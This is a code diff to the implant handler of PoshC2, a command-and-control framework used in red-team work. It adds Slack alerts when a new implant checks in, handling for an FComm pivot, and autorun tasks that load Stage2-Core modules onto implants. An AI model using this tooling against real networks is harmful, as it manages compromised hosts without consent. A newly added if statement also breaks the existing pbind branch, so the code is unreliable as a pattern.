@@ -1,4 +1,4 @@
-import urllib, base64, datetime, http.client
+import urllib, base64, datetime, http.client, json
 
 from poshc2.Colours import Colours
 from poshc2.Utils import randomuri, gen_key
@@ -57,6 +57,8 @@ IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDa
         it = self.Pivot
         if "pbind" in it.lower():
             urlInfo = "PBind"
+        if "fcomm" in it.lower():
+            urlInfo = "FComm"
         else:
             urlInfo = get_url_by_id(self.URLID[0])
             if urlInfo is not None:
@@ -71,16 +73,14 @@ IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDa
         try:
             Pushover_APIToken = select_item("Pushover_APIToken", "C2Server")
             Pushover_APIUser = select_item("Pushover_APIUser", "C2Server")
-
-            if EnableNotifications.lower().strip() == "yes":
+            if EnableNotifications.lower().strip() == "yes" and Pushover_APIToken:
                 conn = http.client.HTTPSConnection("api.pushover.net:443")
                 conn.request("POST", "/1/messages.json",
-                             urllib.parse.urlencode({
-                                 "token": Pushover_APIToken,
-                                 "user": Pushover_APIUser,
-                                 "message": "[%s] - NewImplant: %s @ %s" % (NotificationsProjectName, self.User, self.Hostname),
-                             }), {"Content-type": "application/x-www-form-urlencoded"})
-
+                                 urllib.parse.urlencode({
+                                     "token": Pushover_APIToken,
+                                     "user": Pushover_APIUser,
+                                     "message": "[%s] - NewImplant: %s @ %s" % (NotificationsProjectName, self.User, self.Hostname),
+                                 }), {"Content-type": "application/x-www-form-urlencoded"})
                 output = conn.getresponse()
                 if output.status != 200:
                     data = output.read()
@@ -88,6 +88,31 @@ IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDa
                     print(data)
         except Exception as e:
             print("Pushover send error: %s" % e)
+        try:
+            Slack_BotToken = select_item("Slack_BotToken", "C2Server")
+            if EnableNotifications.lower().strip() == "yes" and Slack_BotToken:
+                mention_userid = select_item("Slack_UserID", "C2Server")
+                channel = select_item("Slack_Channel", "C2Server")
+                Slack_BotToken = str("Bearer ")+Slack_BotToken
+                if mention_userid in ("", None):
+                    mention_userid = ""
+                elif mention_userid.lower().strip() == "channel":
+                    mention_userid = "<!channel> "
+                else:
+                    mention_userid = "<@%s> " % str(mention_userid)
+                message = {"channel": channel, "text": "%s[%s] - NewImplant: %s @ %s" % (mention_userid, NotificationsProjectName, self.User, self.Hostname), "as_user": "true", "link_names": "true"}
+                headers = {"Content-type": "application/json","Authorization": Slack_BotToken }
+                conn = http.client.HTTPSConnection("slack.com:443")
+                conn.request("POST", "/api/chat.postMessage",json.dumps(message), headers)
+                output = conn.getresponse()
+                if output.status != 200:
+                    data = output.read()
+                    print("Slack error: ")
+                    print(data)
+        except Exception as e:
+            print("Slack send error: %s" % e)
+
+
 
     def save(self):
         self.ImplantID = new_implant(self.RandomURI, self.URLID[0], self.User, self.Hostname, self.IPAddress, self.Key, self.FirstSeen, self.FirstSeen, self.PID, self.Arch, self.Domain, self.Alive, self.Sleep, self.ModsLoaded, self.Pivot, self.Label)
@@ -103,9 +128,17 @@ IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDa
         if "PS" in self.Pivot:
             new_task("loadmodule Stage2-Core.ps1", "autoruns", self.RandomURI)
             update_mods("Stage2-Core.ps1", self.RandomURI)
-        if "PB" in self.Pivot:
+        if "PBind Pivot" in self.Pivot:
             update_label("Parent: %s" % self.IPAddress, self.RandomURI)
-            new_task("pbind-loadmodule Stage2-Core.exe", "autoruns", self.RandomURI)
+            #new_task("pbind-pivot-loadmodule Stage2-Core.exe", "autoruns", self.IPAddress)
+            update_mods("Stage2-Core.exe", self.RandomURI)
+        elif "PB" in self.Pivot:
+            update_label("Parent: %s" % self.IPAddress, self.RandomURI)
+            #new_task("pbind-loadmodule Stage2-Core.exe", "autoruns", self.IPAddress)
+            update_mods("Stage2-Core.exe", self.RandomURI)
+        if "FC" in self.Pivot:
+            update_label("Parent: %s" % self.IPAddress, self.RandomURI)
+            new_task("fcomm-loadmodule Stage2-Core.exe", "autoruns", self.RandomURI)
             update_mods("Stage2-Core.exe", self.RandomURI)
         result = get_autoruns()
         if result:
